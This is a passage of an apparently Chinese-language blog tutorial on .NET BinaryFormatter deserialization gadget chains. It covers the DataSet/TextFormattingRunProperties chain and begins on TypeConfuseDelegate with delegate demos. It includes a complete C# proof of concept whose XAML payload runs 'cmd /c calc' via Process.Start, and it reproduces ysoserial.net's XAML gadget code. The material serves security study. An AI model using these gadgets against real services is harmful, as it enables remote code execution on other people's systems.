this.DeserializeDataSetProperties(info, context);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        string s = (string) info.GetValue(&quot;XmlSchema&quot;, typeof (string));</span><br><span class="line">        if (s == null)</span><br><span class="line">          return;</span><br><span class="line">        this.ReadXmlSchema((XmlReader) new XmlTextReader((TextReader) new StringReader(s)), true);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</span><br></pre></td></tr></table></figure><p>主要是这行代码进行了Binary二进制反序列化</p><p><img src="../images/image-20240225183528131.png" alt="image-20240225183528131"></p><p>然后我们就只关注这个serializationStream参数是在哪传入的就行了   我们将第一次的序列化流给其赋值就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</span><br></pre></td></tr></table></figure><p>它来自<code>DataSet.Tables_0</code>的值，那我们在序列化的时候给他赋值为TextFormattingRunProperties的二进制bytes流即可，但是我们也需要给其他属性赋值，否则无法正常反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">info.SetType(typeof(System.Data.DataSet));</span><br><span class="line">            info.AddValue(&quot;DataSet.RemotingFormat&quot;, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(&quot;DataSet.DataSetName&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Namespace&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.Prefix&quot;, &quot;&quot;);</span><br><span class="line">            info.AddValue(&quot;DataSet.CaseSensitive&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.LocaleLCID&quot;, 0x409);</span><br><span class="line">            info.AddValue(&quot;DataSet.EnforceConstraints&quot;, false);</span><br><span class="line">            info.AddValue(&quot;DataSet.ExtendedProperties&quot;, (System.Data.PropertyCollection)null);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables.Count&quot;, 1);</span><br><span class="line">            info.AddValue(&quot;DataSet.Tables_0&quot;, _fakeTable);</span><br></pre></td></tr></table></figure><p>这些值是再yoserial中查看到的   就是得给这些值赋值才行    不然会反序列化失败</p><p><img src="../images/image-20240225183842031.png" alt="image-20240225183842031"></p><p>poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingPropersGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingPropersGadgets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">GetTextFormattingPropersBytes</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                <span class="keyword">return</span> memoryStream.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DataSetMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] _fakeTable;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetFakeTable</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _fakeTable = bfPayload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DatasetGadgets</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> textFormattingPropersBytes = TextFormattingPropersGadgets.GetTextFormattingPropersBytes();</span><br><span class="line">            <span class="keyword">var</span> dataSetMarshal = <span class="keyword">new</span> DataSetMarshal();</span><br><span class="line">            dataSetMarshal.SetFakeTable(textFormattingPropersBytes);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, dataSetMarshal);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">new TextFormattingRunProperties() </span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [2]</span><br><span class="line">ObjectManager.FixupSpecialObject() [2]</span><br><span class="line">ObjectManager.DoFixups() [2]</span><br><span class="line">ObjectReader.Deserialize() [2]</span><br><span class="line">BinaryFormatter.Deserialize() [2]</span><br><span class="line">DataSet.DeserializeDataSetSchema() </span><br><span class="line">new DataSet()</span><br><span class="line">new DataSet()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject() [1]</span><br><span class="line">ObjectManager.FixupSpecialObject() [1]</span><br><span class="line">ObjectManager.DoFixups() [1]</span><br><span class="line">ObjectReader.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize() </span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">DatasetGadgets.Main()</span><br></pre></td></tr></table></figure><h2 id="TypeConfuseDelegate"><a href="#TypeConfuseDelegate" class="headerlink" title="TypeConfuseDelegate"></a>TypeConfuseDelegate</h2><p>TypeConfuseDelegate中文翻译过来叫类型混淆委托。那么学习这条链之前必须要了解什么是委托。 其并不是一个类</p><h3 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h3><p>其实是跟java的动态代理是差不多意思的</p><p>给个委派的demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate myDelegate = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        myDelegate(<span class="string">&quot;hello from delegate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226094829689.png" alt="image-20240226094829689"></p><p><strong>需要注意的是传递给委托的方法签名必须和定义的委托签名一致，即返回值、参数一致(参数类型和数量一致)。</strong></p><p>通过new MyDelegate(PrintString)将PrintString的引用赋值给myDelegate，然后使用myDelegate(“hello from delegate”)传递参数。myDelegate持有对PrintString的引用。</p><h3 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h3><p>多播委托则是持有对委托列表的引用，<strong>把多播委托想象成一个列表</strong>，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">namespace DonNET_Deserialization;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    public delegate void MyDelegate(string s);</span><br><span class="line"></span><br><span class="line">    public static void PrintString(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;print &#123;s&#125; to screen.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void WriteToFile(string s)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine($&quot;write &#123;s&#125; to file.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate myDelegate = new MyDelegate(PrintString);</span><br><span class="line">        MyDelegate myDelegate1 = new MyDelegate(WriteToFile);</span><br><span class="line">        myDelegate += myDelegate1;</span><br><span class="line">        myDelegate(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226095215225.png" alt="image-20240226095215225"></p><p><img src="../images/image-20240226095231589.png" alt="image-20240226095231589"></p><p>其实重点就在于这   是可以进行相加的   把其想象成一个列表  调用的时候会从中依次进行调用</p><p><strong>还可以用MulticastDelegate.Combine(printString, writeFile)的形式。(主要是使用这种方法)</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;print <span class="subst">&#123;s&#125;</span> to screen.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteToFile</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;write <span class="subst">&#123;s&#125;</span> to file.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate printString = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        MyDelegate writeFile = <span class="keyword">new</span> MyDelegate(WriteToFile);</span><br><span class="line">        Delegate twoDelegte = MulticastDelegate.Combine(printString, writeFile);</span><br><span class="line">        twoDelegte.DynamicInvoke(<span class="string">&quot;something&quot;</span>);  <span class="comment">//调用函数</span></span><br><span class="line">        Delegate[] delegates = twoDelegte.GetInvocationList();   <span class="comment">//查看存入列表中的函数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> delegates)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(item.Method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226095516526.png" alt="image-20240226095516526"></p><h3 id="SortedSet和Comparer"><a href="#SortedSet和Comparer" class="headerlink" title="SortedSet和Comparer"></a>SortedSet和Comparer</h3><p>ysoserial.net中链子的样子</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">GetXamlGadget</span>(<span class="params"><span class="built_in">string</span> xaml_payload</span>)</span></span><br><span class="line">       &#123;</span><br><span class="line">           Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">           Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">           IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">           SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line">           <span class="keyword">set</span>.Add(xaml_payload);</span><br><span class="line">           <span class="keyword">set</span>.Add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">           <span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line">           <span class="comment">// We use XamlReader.Parse() to trigger the xaml execution</span></span><br><span class="line">           invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;(System.Windows.Markup.XamlReader.Parse);</span><br><span class="line">           fi.SetValue(d, invoke_list);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">set</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>其实看起来和我们上面用到的不太一样  </p><p>这里是通过<code>SortedSet&lt;T&gt;</code>和<code>Comparer</code>进行利用的   接下来介绍一下这两个类</p><p>给一个简单的demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ByFileExtension</span> : <span class="title">IComparer</span>&lt;<span class="title">string</span>&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> xExt, yExt;</span><br><span class="line"></span><br><span class="line">        CaseInsensitiveComparer caseiComp = <span class="keyword">new</span> CaseInsensitiveComparer();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Compare</span>(<span class="params"><span class="built_in">string</span> x, <span class="built_in">string</span> y</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Parse the extension from the file name.</span></span><br><span class="line">            xExt = x.Substring(x.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">            yExt = y.Substring(y.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Compare the file extensions.</span></span><br><span class="line">            <span class="built_in">int</span> vExt = caseiComp.Compare(xExt, yExt);</span><br><span class="line">            <span class="keyword">if</span> (vExt != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> vExt;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// The extension is the same,</span></span><br><span class="line">                <span class="comment">// so compare the filenames.</span></span><br><span class="line">                <span class="keyword">return</span> caseiComp.Compare(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(<span class="keyword">new</span> ByFileExtension());</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.c&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.b&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.a&quot;</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> <span class="keyword">set</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(item.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">test.a</span><br><span class="line">test.b</span><br><span class="line">test.c</span><br></pre></td></tr></table></figure><p>看懂这个demo的话   就会对我们下面yso链子有更好的理解了</p><p><img src="../images/image-20240226100148484.png" alt="image-20240226100148484"></p><ul><li>实现了这个<code>IComparer&lt;string&gt;</code>接口</li><li>重写了这个<code>Compare</code>函数</li></ul><p><img src="../images/image-20240226100353073.png" alt="image-20240226100353073"></p><p>然后将我们的ByFileExtension类放入到SortedSet类中  然后set.Add添加值进去比较</p><p>那么这个是我们自己手动添加的类和比较器  所以在yso是得自动生成  </p><p><img src="../images/image-20240226100555050.png" alt="image-20240226100555050"></p><p>都是必须得满足这两个条件</p><h3 